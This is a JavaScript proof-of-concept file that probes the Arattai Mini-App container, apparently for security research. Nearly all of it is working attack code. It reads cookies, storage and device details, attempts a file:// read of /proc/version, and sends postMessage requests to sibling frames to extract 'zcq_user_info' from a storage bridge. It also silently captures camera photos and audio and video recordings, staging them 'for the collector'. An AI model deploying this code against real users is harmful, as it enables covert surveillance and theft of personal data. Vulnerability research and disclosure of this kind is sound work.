// Capability probes for Arattai Mini-App PoC
// Each probe returns a Promise<{name, status, detail}> where status is
// "VULN", "SAFE", "N/A", or "INFO".

(function(global) {
    "use strict";

    var client = global.ArattaiClientDetect || { id: "browser", label: "Unknown" };

    // ------------------------------------------------------------------ helpers

    function probe(name, fn) {
        return Promise.resolve().then(fn).then(function(detail) {
            return { name: name, status: "VULN", detail: detail };
        }).catch(function(e) {
            // A catch here means the probe returned SAFE or N/A via a rejection
            var result = e && e.__probeResult ? e.__probeResult :
                         { status: "SAFE", detail: String(e) };
            return { name: name, status: result.status, detail: result.detail };
        });
    }

    function safe(detail)  { var e = new Error(); e.__probeResult = { status: "SAFE",  detail: detail }; throw e; }
    function na(detail)    { var e = new Error(); e.__probeResult = { status: "N/A",   detail: detail }; throw e; }
    function info(detail)  { var e = new Error(); e.__probeResult = { status: "INFO",  detail: detail }; throw e; }

    function timeout(ms) {
        return new Promise(function(_, reject) {
            setTimeout(function() { reject(new Error("timeout")); }, ms);
        });
    }

    // ------------------------------------------------------------------ probes

    // 1. JS execution — always VULN if this code runs
    function probeJsExec() {
        return probe("JavaScript Execution", function() {
            return "JS runs inside the Mini-App container. UA: " + navigator.userAgent.slice(0, 120);
        });
    }

    // 2. Environment fingerprint (INFO — shows what is readable)
    function probeFingerprint() {
        return probe("Environment Fingerprint", function() {
            var data = {
                userAgent: navigator.userAgent,
                platform:  navigator.platform,
                language:  navigator.language,
                screenW:   screen.width,
                screenH:   screen.height,
                cookieEnabled: navigator.cookieEnabled,
                onLine:    navigator.onLine,
                href:      location.href
            };
            info(JSON.stringify(data, null, 2));
        });
    }

    // 3. Cookie read
    function probeCookies() {
        return probe("Cookie Access", function() {
            var c = document.cookie;
            if (c && c.length > 0) {
                return "cookies readable: " + c.slice(0, 300);
            }
            info("no cookies set on this origin (expected — attacker origin)");
        });
    }

    // 4. localStorage read
    function probeLocalStorage() {
        return probe("localStorage Read", function() {
            try {
                localStorage.setItem("_arattai_poc_probe", "1");
                var v = localStorage.getItem("_arattai_poc_probe");
                localStorage.removeItem("_arattai_poc_probe");
                if (v === "1") return "localStorage readable/writable on this origin";
                safe("write succeeded but read returned wrong value");
            } catch(e) {
                safe("localStorage blocked: " + e.message);
            }
        });
    }

    // 5. Mixed-content load (Android MIXED_CONTENT_ALWAYS_ALLOW)
    function probeMixedContent() {
        return probe("Mixed-Content Load (HTTP subresource from HTTPS page)", function() {
            if (!location.protocol || location.protocol !== "https:") {
                na("page loaded via " + location.protocol + " — mixed-content N/A");
            }
            return new Promise(function(resolve, reject) {
                var img = new Image();
                var done = false;
                img.onload = function() {
                    if (done) return; done = true;
                    resolve("HTTP subresource loaded inside HTTPS Mini-App container (MIXED_CONTENT_ALWAYS_ALLOW confirmed)");
                };
                img.onerror = function() {
                    if (done) return; done = true;
                    var e = new Error(); e.__probeResult = { status: "SAFE", detail: "HTTP image blocked (mixed-content policy active)" }; reject(e);
                };
                // Use a reliable 1x1 HTTP endpoint — replace with your own if needed
                img.src = "http://httpforever.com/img/favicon-32x32.png?poc=" + Date.now();
                setTimeout(function() {
                    if (!done) { done = true; resolve("HTTP image load timed out — inconclusive (check network)"); }
                }, 4000);
            });
        });
    }

    // 6. file:// local-read attempt (Android allowFileAccess)
    function probeFileAccess() {
        return probe("file:// Local-Read Attempt", function() {
            // Only meaningful in an Android WebView with allowFileAccess=true.
            // We try to fetch a known-predictable path; WebKit SOP blocks file:// from https:// origins
            // directly, but the attempt itself confirms whether the scheme is reachable.
            return new Promise(function(resolve, reject) {
                var testPaths = [
                    "file:///proc/version",          // Linux kernel info
                    "file:///android_asset/webkit/android-weberror.png"  // bundled asset
                ];
                var path = testPaths[0];
                fetch(path, { mode: "no-cors" }).then(function(r) {
                    resolve("fetch('" + path + "') did NOT throw — possible file:// access (check response body in DevTools)");
                }).catch(function(e) {
                    var err = new Error();
                    err.__probeResult = { status: "SAFE", detail: "fetch blocked for " + path + ": " + e.message };
                    reject(err);
                });
                // Also try iframe navigation
                setTimeout(function() {}, 50);
            });
        });
    }

    // 7. Geolocation permission probe
    function probeGeolocation() {
        return probe("Geolocation Permission", function() {
            if (!navigator.geolocation) {
                na("navigator.geolocation not available");
            }
            return new Promise(function(resolve, reject) {
                var timer = setTimeout(function() {
                    var e = new Error(); e.__probeResult = { status: "SAFE", detail: "geolocation prompt not auto-granted (timed out)" }; reject(e);
                }, 4000);
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        clearTimeout(timer);
                        resolve("geolocation AUTO-GRANTED — lat: " + pos.coords.latitude.toFixed(4) + " lon: " + pos.coords.longitude.toFixed(4));
                    },
                    function(err) {
                        clearTimeout(timer);
                        var e = new Error(); e.__probeResult = { status: "SAFE", detail: "geolocation denied/prompt shown: " + err.message }; reject(e);
                    },
                    { timeout: 3500, maximumAge: 0 }
                );
            });
        });
    }

    // 8. Camera/mic permission probe
    function probeMediaDevices() {
        return probe("Camera/Microphone Permission", function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                na("getUserMedia not available");
            }
            return navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) {
                    stream.getTracks().forEach(function(t) { t.stop(); });
                    return "microphone AUTO-GRANTED without user prompt";
                })
                .catch(function(e) {
                    safe("media prompt shown or denied: " + e.message);
                });
        });
    }

    // 9. postMessage storage bridge (Web client only — W2)
    function probePostMessageBridge() {
        return probe("postMessage Storage Bridge (Web client — W2)", function() {
            // This probe targets the db-handler.js storage iframe in the Arattai web shell.
            // db-handler.js listens for { type: 'LocalStorageRequest', params, requestId }
            // and responds with event.source.postMessage({ type: 'LocalStorageResponse', result }, event.origin).
            // It fires meaningful results when the mini-app runs inside the Arattai web app as a sibling iframe.
            var referrer = document.referrer || "";
            var isInsideArattaiWeb = (
                window.parent !== window &&
                (
                    referrer.indexOf("arattai") >= 0 ||
                    client.id === "browser" ||
                    client.id === "electron"
                )
            );
            if (!isInsideArattaiWeb) {
                na("not inside Arattai web shell — skipping postMessage bridge probe");
            }

            return new Promise(function(resolve, reject) {
                var results = {};
                var done = false;
                var requestId = "poc-" + Date.now();

                function sendRequest(target) {
                    try {
                        target.postMessage({
                            type: "LocalStorageRequest",
                            params: { methodName: "getItem", arguments: "zcq_user_info" },
                            requestId: requestId
                        }, "*");
                    } catch(e2) { /* cross-origin — postMessage itself is allowed; ignore other errors */ }
                }

                function finish() {
                    if (done) return;
                    done = true;
                    window.removeEventListener("message", handler);
                    if (Object.keys(results).length > 0) {
                        resolve("STORAGE BRIDGE VULN — " + Object.keys(results)[0] +
                                " received from origin: " + results.__origin +
                                " · value: " + String(results[Object.keys(results)[0]]).slice(0, 200));
                    } else {
                        var e = new Error();
                        e.__probeResult = { status: "SAFE", detail: "no response from storage bridge within 10 s timeout" };
                        reject(e);
                    }
                }

                var timer = setTimeout(finish, 10000);

                function handler(event) {
                    var type = event.data && event.data.type;
                    if (type === "LocalStorageResponse" || type === "SessionStorageResponse" || type === "IDBResponse") {
                        if (!done) {
                            results[type] = event.data.result !== undefined ? event.data.result : event.data.error;
                            results.__origin = event.origin;
                            clearTimeout(timer);
                            finish();
                        }
                    }
                    // If the storage iframe announces itself AFTER our probe fires, immediately send the request
                    if (type === "arattai_iframe_loaded" && !done) {
                        sendRequest(event.source);
                    }
                }

                window.addEventListener("message", handler);

                // Blast to parent and all sibling frames (db-handler.js runs in a child iframe of the shell)
                if (window.parent !== window) {
                    sendRequest(window.parent);
                }
                if (window.parent && window.parent.frames) {
                    for (var i = 0; i < window.parent.frames.length; i++) {
                        sendRequest(window.parent.frames[i]);
                    }
                }
                // Also try top-level frames (handles nested iframe scenarios)
                if (window.top && window.top !== window.parent && window.top.frames) {
                    for (var j = 0; j < window.top.frames.length; j++) {
                        sendRequest(window.top.frames[j]);
                    }
                }
                // Retry after 2 s in case storage iframe loads lazily
                setTimeout(function() {
                    if (done) return;
                    if (window.parent !== window) sendRequest(window.parent);
                    if (window.parent && window.parent.frames) {
                        for (var k = 0; k < window.parent.frames.length; k++) {
                            sendRequest(window.parent.frames[k]);
                        }
                    }
                }, 2000);
            });
        });
    }

    // 11. Camera photo capture
    function probeCameraCapture() {
        return probe("Camera Photo Capture", function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                na("getUserMedia not available");
            }
            // No constraints — bare {video:true} avoids OverconstrainedError on Android WebView
            return navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                    return new Promise(function(resolve, reject) {
                        var video = document.createElement("video");
                        video.muted = true;
                        video.playsInline = true;
                        video.srcObject = stream;
                        video.play();
                        setTimeout(function() {
                            try {
                                var w = video.videoWidth  || 320;
                                var h = video.videoHeight || 240;
                                var canvas = document.createElement("canvas");
                                canvas.width  = Math.min(w, 640);
                                canvas.height = Math.min(h, 480);
                                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                                var dataUrl = canvas.toDataURL("image/jpeg", 0.6);
                                stream.getTracks().forEach(function(t) { t.stop(); });
                                window.__capturedPhoto = dataUrl;
                                resolve("PHOTO CAPTURED (" + canvas.width + "×" + canvas.height + ") — " +
                                        Math.round(dataUrl.length * 3 / 4 / 1024) + " KB — sending to collector");
                            } catch(e2) {
                                stream.getTracks().forEach(function(t) { t.stop(); });
                                var err = new Error();
                                err.__probeResult = { status: "SAFE", detail: "capture error: " + (e2.name || "") + " " + e2.message };
                                reject(err);
                            }
                        }, 2500);
                    });
                }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
        });
    }

    // 12. Microphone audio recording (5 s)
    // Delayed 1.5 s so probeMediaDevices (probe 8) finishes and releases the mic before we acquire it
    function probeAudioRecord() {
        return probe("Microphone Audio Recording (5 s)", function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { na("getUserMedia not available"); }
            if (typeof MediaRecorder === "undefined") { na("MediaRecorder not supported in this browser"); }
            return new Promise(function(r) { setTimeout(r, 1500); }).then(function() {
                return navigator.mediaDevices.getUserMedia({ audio: true });
            }).then(function(stream) {
                return new Promise(function(resolve, reject) {
                    var chunks = [];
                    var rec;
                    try { rec = new MediaRecorder(stream); }
                    catch(e2) {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        var err = new Error();
                        err.__probeResult = { status: "SAFE", detail: "MediaRecorder init: " + (e2.name || "") + " " + e2.message };
                        reject(err); return;
                    }
                    rec.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
                    rec.onstop = function() {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        var blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
                        var reader = new FileReader();
                        reader.onload = function() {
                            window.__capturedAudio = reader.result;
                            resolve("AUDIO RECORDED: " + Math.round(blob.size / 1024) + " KB" +
                                    " (" + (rec.mimeType || "audio/webm") + ") — sending to collector");
                        };
                        reader.readAsDataURL(blob);
                    };
                    rec.start(200);
                    setTimeout(function() { try { rec.stop(); } catch(e3) {} }, 5000);
                });
            }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
        });
    }

    // 13. Camera + mic video recording (5 s)
    // Starts at 7 s — after audio probe (1.5 s delay + 5 s recording) finishes and releases both mic and camera
    function probeVideoRecord() {
        return probe("Camera+Mic Video Recording (5 s)", function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { na("getUserMedia not available"); }
            if (typeof MediaRecorder === "undefined") { na("MediaRecorder not supported in this browser"); }
            return new Promise(function(res) { setTimeout(res, 7000); }).then(function() {
                return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            }).then(function(stream) {
                return new Promise(function(resolve, reject) {
                    var chunks = [];
                    var rec;
                    try { rec = new MediaRecorder(stream); }
                    catch(e2) {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        var err = new Error();
                        err.__probeResult = { status: "SAFE", detail: "MediaRecorder init: " + (e2.name || "") + " " + e2.message };
                        reject(err); return;
                    }
                    rec.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
                    rec.onstop = function() {
                        stream.getTracks().forEach(function(t) { t.stop(); });
                        var blob = new Blob(chunks, { type: rec.mimeType || "video/webm" });
                        var reader = new FileReader();
                        reader.onload = function() {
                            window.__capturedVideo = reader.result;
                            resolve("VIDEO RECORDED: " + Math.round(blob.size / 1024) + " KB" +
                                    " (" + (rec.mimeType || "video/webm") + ") — sending to collector");
                        };
                        reader.readAsDataURL(blob);
                    };
                    rec.start(200);
                    setTimeout(function() { try { rec.stop(); } catch(e3) {} }, 5000);
                });
            }).catch(function(e) { safe((e.name || "Error") + ": " + e.message); });
        });
    }

    // 10. Electron DesktopModule bridge (informational)
    function probeElectronBridge() {
        return probe("Electron DesktopModule Bridge", function() {
            if (client.badge !== "desktop") {
                na("not running in Electron");
            }
            if (typeof window.DesktopModule !== "undefined") {
                var keys = Object.keys(window.DesktopModule);
                return "DesktopModule exposed via contextBridge. Methods: " + keys.join(", ");
            }
            safe("DesktopModule not found on window (expected — running in sandboxed frame)");
        });
    }

    // ------------------------------------------------------------------ runner

    global.ArattaiProbes = {
        all: function() {
            return Promise.all([
                probeJsExec(),
                probeFingerprint(),
                probeCookies(),
                probeLocalStorage(),
                probeMixedContent(),
                probeFileAccess(),
                probeGeolocation(),
                probeMediaDevices(),
                probePostMessageBridge(),
                probeElectronBridge(),
                probeCameraCapture(),
                probeAudioRecord(),
                probeVideoRecord()
            ]);
        }
    };

})(window);
